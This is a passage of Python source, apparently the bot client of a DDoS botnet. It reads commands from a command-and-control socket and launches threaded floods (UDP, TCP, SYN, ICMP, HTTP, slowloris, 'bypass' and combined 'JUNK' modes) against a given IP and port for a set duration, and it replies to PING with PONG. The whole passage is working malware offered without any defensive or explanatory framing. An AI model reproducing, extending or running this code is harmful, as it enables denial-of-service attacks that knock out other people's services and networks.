            elif command == '.HTTP_5050':
                 
                ip = args[1]
                secs = time.time() + int(args[2])
                threads = int(args[3])

                for _ in range(threads):
                    threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
            elif command == '.HTTP_GET':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_http2, args=(ip, port, secs), daemon=True).start()
            elif command == '.HTTP_PPS':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_pps, args=(ip, port, secs), daemon=True).start()
            elif command == '.STD':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_std, args=(ip, port, secs), daemon=True).start()
            elif command == '.SLOW':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=sloworis, args=(ip, port, secs), daemon=True).start()
            elif command == '.HEX':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
            elif command == '.HEXCPU':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                    threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
            elif command == '.CPUKILL':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
            elif command == '.VSE':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
            elif command == '.HTTP_MIX':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_http2, args=(ip, port, secs), daemon=True).start()
                    threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
            elif command == '.TUP_OLD':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.JUNK':
                
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                method = args[4]
                threads = int(args[5])
                
                if "1" in method:
                    for _ in range(threads):
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        for _ in range(threads):
                            threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                            threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
                            threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                elif "2" in method:
                    for _ in range(threads):
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                    for _ in range(threads):
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                elif "3" in method:
                    for _ in range(threads):
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                elif "4" in method:
                    for _ in range(threads):
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
                        threading.Thread(target=attack_http2, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cc, args=(ip, port, secs), daemon=True).start()
                elif "5" in method:
                    for _ in range(threads):
                        size = 65500
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
                        threading.Thread(target=attack_http2, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cc, args=(ip, port, secs), daemon=True).start()
                elif "6" in method:
                    for _ in range(threads):
                        size = 65500
                        url = f"http://{ip}"
                        threading.Thread(target=REQ_attack, args=(url, port, secs), daemon=True).start()
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
                        threading.Thread(target=attack_http2, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cc, args=(ip, port, secs), daemon=True).start()
                        url = f"https://{ip}"
                        threading.Thread(target=REQ_attack, args=(url, port, secs), daemon=True).start()
                elif "7" in method:
                    for _ in range(threads):
                        size = 65500
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
                        threading.Thread(target=attack_http2, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_udp_bypass, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_tcp_bypass, args=(ip, port, secs,size), daemon=True).start()
                        threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_cc, args=(ip, port, secs), daemon=True).start()
            elif command == 'PING':
                c2.send('PONG'.encode())

        except:
            break

    c2.close()

    main()

if __name__ == '__main__':
    try:
        main()
    except:
        pass